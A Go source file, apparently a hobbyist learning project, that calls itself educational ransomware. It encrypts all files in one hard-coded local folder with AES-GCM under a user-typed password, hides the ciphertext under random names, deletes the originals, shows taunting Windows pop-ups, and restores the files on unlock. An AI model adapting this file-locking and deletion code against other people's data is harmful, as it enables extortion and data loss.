package main

import (
    "crypto/aes"
    "crypto/cipher"
    cryptoRand "crypto/rand"  // ← Renombrado para evitar conflicto
    "crypto/sha256"
    "encoding/json"
    "fmt"
    "io"
    mathRand "math/rand"  // ← Renombrado para evitar conflicto
    "os"
    "path/filepath"
    "strings"
    "syscall"
    "time"
	"unsafe"
    
    "golang.org/x/term"

	"golang.org/x/sys/windows"
)

// ============================================================================
// CONSTANTS
// ============================================================================
const (
    VERSION       = "1.0"
    TARGET_DIR    = "./archivos_privados"  // Carpeta objetivo
    MAPPING_FILE  = ".secret_mapping.enc"  // Archivo con el mapeo
    HIDDEN_FOLDER = ".hidden_data"         // Carpeta donde ocultar
)

// ============================================================================
// DATA STRUCTURES
// ============================================================================

// FileMapping guarda la relación entre archivo original y oculto
type FileMapping struct {
    OriginalPath string `json:"original"`
    HiddenPath   string `json:"hidden"`
}

// Lista de personajes 
var castlevaniaCharacters = []string{
	"Carmilla", "Lenore", "Morana", "Tera", "Maria", "Annette", "Drolta", "Striga", // Agregar una coma después del último nombre porque de lo contrario mandará un sinxatis error
}


func main(){
	//Banner o main page
	banner() // Mostramos el banner

	if len(os.Args) < 2 { // Los argumentos que se le pasarn a la herramienta, por ejemplo solo tenemos 3 -> lock, unlock, help
		help()
		os.Exit(1)
	}

	comando := os.Args[1]

	switch comando{ // Lista de comandos, solo uno. 
	case "a":
		about()
	case "l":
		showWarning()
		password := getPsswd()  // ← Obtener contraseña primero
		lockFiles(password)     // ← Pasar contraseña a lockFiles
		showFuckOff()
	case "u":
		password := getPsswd()
		unlock(password)
	case "g":
		fmt.Println(generatePasswd())
	case "gp":
		getPsswd()
	case "h":
		help()
	default: 
		fmt.Println("Not valid command", comando)
		os.Exit(1)
	}
	
}

//Lo que se va a imprimir en consola
func banner() {
    fmt.Println("╔════════════════════════════╗")
    fmt.Printf("║  Ransomware v%s           ║\n", VERSION) // Printf nos imprime con formato, algo parcido al -e en  bash
    fmt.Println("║  Educational Tool          ║")
    fmt.Println("╚════════════════════════════╝")
	fmt.Println("                by: AreiaNight")
}

func help() {
    fmt.Println("\nCommand lines:")
    fmt.Println("- l  > for encrypt the files")
    fmt.Println("- u  > for decrypt the files")
    fmt.Println("- a  > about this project and some background")
	fmt.Println("- g  > genera una contraseña temporal")
	fmt.Println("- ga > ingresa la contraseña\n")
}

func about() {
    fmt.Println("\nThis is a educational project, I created this because as a kid I wanted a bait for possible thiefs \n(in my country is usual) and make my computer unreachable. So this is a kind of ransomware based on that idea \nbecause this isn't for malicious propouses but a way for me to learn go and make that idea I had as a little girl true\n") 
}


func generatePasswd() string{
	mathRand.Seed(time.Now().UnixNano()) // Generar semilla random basado en el tiempo actual y nano segundos

	var selected[]string // variable tipo slice para guardar los personajes, el var puede actuar como un :=
	usedIndices := make(map[int]bool) // Mapa para asegurarnos que no se repitan personajes, es como una matriz (mapa) 
	
	for len(selected) < 3 {

		idx := mathRand.Intn(len(castlevaniaCharacters))

		if !usedIndices[idx] { 
			selected = append(selected, castlevaniaCharacters[idx])
			usedIndices[idx] = true 
		}
	}

	numero := mathRand.Intn(100)
	recovery := fmt.Sprintf("\n%s-%s-%s-%d", selected[0], selected[1], selected[2], numero)
	return recovery
}

func getPsswd() []byte{
	fmt.Print("Password: ")
	passwd, err := term.ReadPassword(int(syscall.Stdin)) // Al momento de escribir no lo muestra en pantalla, es de la libreria de golang.org/x/term
	fmt.Println() // Print vacio para que se haga el salto de linea por si da error

	if err != nil{ // Error por si la terminal no soporta entrada de texto
		fmt.Println("[!]Error, no password detected")
		os.Exit(1)
	}

	if len(passwd) == 0 { // Verificacion de que no este vacio la entrada
		fmt.Println("[!]Error: Password is empty")
		os.Exit(1)
	}

	hash := sha256.Sum256(passwd) // Convertimos el password a hash 
	return hash[:]
}

// Funcion para generar nombre aleatorio 
func generateRandomName() string {
    b := make([]byte, 16)
    cryptoRand.Read(b)  // ← Usar cryptoRand
    return fmt.Sprintf("%x.dat", b)
}


//Funcion para encryptar 
func encrypt(data []byte, key []byte) ([]byte, error){
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(cryptoRand.Reader, nonce); err != nil{  // ← Usar cryptoRand
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func lockFiles(key []byte){  // ← Agregar parámetro key

	if _, err := os.Stat(TARGET_DIR); os.IsNotExist(err){
		fmt.Printf("[!]Error: Directory %s does not exist\n", TARGET_DIR)
		fmt.Printf("   Create it first: mkdir %s\n", TARGET_DIR)
		os.Exit(1)
	}

	fmt.Println("You little piece of shit, you are so done\n")

	//Carpeta oculta para guardar los archivos encriptados, para eso usamos un filepath.Join() que une rutas de forma segura
	hiddenDir := filepath.Join(TARGET_DIR, HIDDEN_FOLDER)
	//Creamos la carpeta con derechos de lectura para admin (owner)
	os.MkdirAll(hiddenDir, 0o700) 

	var mappings []FileMapping // Slice para guardar el mapeo que se hara
	count := 0

	//Recorrer los archivos dentro del directorio establecido 
	err := filepath.Walk(TARGET_DIR, func(path string, info os.FileInfo, err error) error {  // ← Agregar "error" y abrir llave
		if err != nil {
			return err 
		}

		// Ignorar directorios
		if info.IsDir() {
			return nil
		}

		// Ignorar archivos ocultos (que empiezan con .)
		if strings.HasPrefix(info.Name(), ".") {
			return nil
		}

		// Ignorar si está en la carpeta oculta
		if strings.Contains(path, HIDDEN_FOLDER) {
			return nil
		}

		fmt.Printf("   Processing %s\n", info.Name())

		//Leer archivos 
		data, err := os.ReadFile(path)
		if err != nil {
			fmt.Printf("    [x] Error reading %v\n", err)
			return nil  // ← Continuar con siguiente archivo
		}

		//Encripta el archivo 
		encrypted, err := encrypt(data, key)  // ← encrypted (no encrypt)
		if err != nil {
			fmt.Printf("    [x] Error encrypting %v\n", err)
			return nil  // ← Continuar con siguiente archivo
		}

		//Generar nombre aleatorio
		randomName := generateRandomName()
		hiddenPath := filepath.Join(hiddenDir, randomName)

		//Guarda el archivo encriptado 
		err = os.WriteFile(hiddenPath, encrypted, 0o644)  // ← hiddenPath (minúscula) y 0o644
		if err != nil{
			fmt.Printf("    [x] Error saving %v\n", err)
			return nil  // ← Continuar con siguiente archivo
		}

		//Guarda el mapeo 
		mappings = append(mappings, FileMapping{ 
			OriginalPath: path,
			HiddenPath:   hiddenPath,
		})

		//Borrar los originales
		err = os.Remove(path)
		if err != nil {
			fmt.Printf("    [!] Error: %v cannot be deleted\n", err)
		}

		fmt.Printf("    %s → %s\n", info.Name(), randomName)
		count++

		return nil  // ← Importante: retornar nil para continuar

	})  // ← Cerrar la función Walk aquí

	// Verificar error del Walk
	if err != nil{
		fmt.Printf("[x] Error walking directory: %v\n", err)
		os.Exit(1)
	}

	if count == 0 {
		fmt.Println("\n[!] No files found to encrypt")
		return
	}

	//Guardamos el mapeo encriptado 
	mappingData, _ := json.Marshal(mappings)
	encryptedMapping, _ := encrypt(mappingData, key)
	mappingPath := filepath.Join(TARGET_DIR, MAPPING_FILE)
	os.WriteFile(mappingPath, encryptedMapping, 0o644)

	fmt.Printf("\nAll files encrypted: %d\n", count)
}

// Desencriptación 

func decrypt(data []byte, key []byte) ([]byte, error){ 

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize() 
	if len(data) < nonceSize{
		return nil, fmt.Errorf("Data corrupted or incomplete")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil{
		return nil, fmt.Errorf("password incorrect or corrupted files")
	}

	return plaintext, nil

}

func unlock(key []byte){  
    fmt.Println("\nUnlocking files")  

    //Verifica el directorio target
    if _, err := os.Stat(TARGET_DIR); os.IsNotExist(err){
        fmt.Printf("[!] Error: Directory %s does not exist\n", TARGET_DIR)
        os.Exit(1) 
    }
    
    //Verificamos que el file del mapeo existe 
    mappingPath := filepath.Join(TARGET_DIR, MAPPING_FILE)
    if _, err := os.Stat(mappingPath); os.IsNotExist(err) {  
        fmt.Println("[!]Error: No encrypted file found")
        fmt.Println("          Nothing to unlock")
        os.Exit(1)
    }
    
    //Leer archivo 
    encryptedMapping, err := os.ReadFile(mappingPath)
    if err != nil {
        fmt.Printf("[x]Error reading mapping file: %v\n", err) 
        os.Exit(1)
    }
    
    // Desencriptamos el mapeo
    mappingData, err := decrypt(encryptedMapping, key)  
    if err != nil {
        fmt.Println("[x]Error: Wrong password or corrupted data")  
        fmt.Printf("          Details: %v\n", err)  
        os.Exit(1)
    }
    
    // Convertimos el json a Go 
    var mappings []FileMapping
    err = json.Unmarshal(mappingData, &mappings)
    if err != nil {
        fmt.Printf("[x] Error parsing mapping data: %v\n", err)
        os.Exit(1)
    }
    
    if len(mappings) == 0 {
        fmt.Println("[!] No files to unlock")  
        return 
    }
    
    fmt.Printf("Found %d files to unlock\n", len(mappings))
    
    // Restaurar archivos
    count := 0
    for _, mapping := range mappings{  
        fmt.Printf("   Processing: %s\n", filepath.Base(mapping.OriginalPath))
        
        //Leemos el archivo 
        encryptedData, err := os.ReadFile(mapping.HiddenPath)
        if err != nil{  
            fmt.Printf("      [x] Error reading encrypted file: %v\n", err)
            continue
        }
        
        // Desencriptamos el archivo  
        decryptedData, err := decrypt(encryptedData, key)
        if err != nil {
            fmt.Printf("      [x] Error decrypting: %v\n", err)
            continue
        }
        
        //Crear directorios si no existen 
        originalDir := filepath.Dir(mapping.OriginalPath)
        os.MkdirAll(originalDir, 0o755)
        
        //Guardamos con nombres originales 
        err = os.WriteFile(mapping.OriginalPath, decryptedData, 0o644)
        if err != nil{  
            fmt.Printf("      [x] Error restoring file: %v\n", err)  
            continue  
        }
        
        // Borrar archivo encriptado 
        err = os.Remove(mapping.HiddenPath)
        if err != nil{
            fmt.Printf("      [!] Warning: could not delete encrypted file: %v\n", err)
        }
        
        fmt.Printf("      [o] Restored: %s\n", filepath.Base(mapping.OriginalPath))
        count++
    }
    
    //Limpiamos el mapping y demas
    err = os.Remove(mappingPath)
    if err != nil{
        fmt.Printf("[!]Warning, could not delete mapping file %v\n", err)  
    }
    
    hiddenDir := filepath.Join(TARGET_DIR, HIDDEN_FOLDER)
    err = os.RemoveAll(hiddenDir)
    if err != nil {
        fmt.Printf("[!]Warning, could not delete hidden folder: %v\n", err)  
    }
    
    fmt.Printf("\n Successfully unlocked %d files\n", count)
    fmt.Println("Files restored, welcome back, mistress Areia.")
}

func showWarning() {
	user32 := windows.NewLazySystemDLL("user32.dll")
	messageBox := user32.NewProc("MessageBoxW")

	text, _ := windows.UTF16PtrFromString("Oh, you will regrete this")
	title, _ := windows.UTF16PtrFromString("Warning")

	messageBox.Call(
		0,
		uintptr(unsafe.Pointer(text)),
		uintptr(unsafe.Pointer(title)),
		0x30,
	)
}


func showFuckOff() {
	user32 := windows.NewLazySystemDLL("user32.dll")
	messageBox := user32.NewProc("MessageBoxW")

	text, _ := windows.UTF16PtrFromString("All gone, fuck you!")
	title, _ := windows.UTF16PtrFromString("Warning")

	messageBox.Call(
		0,
		uintptr(unsafe.Pointer(text)),
		uintptr(unsafe.Pointer(title)),
		0x30,
	)
}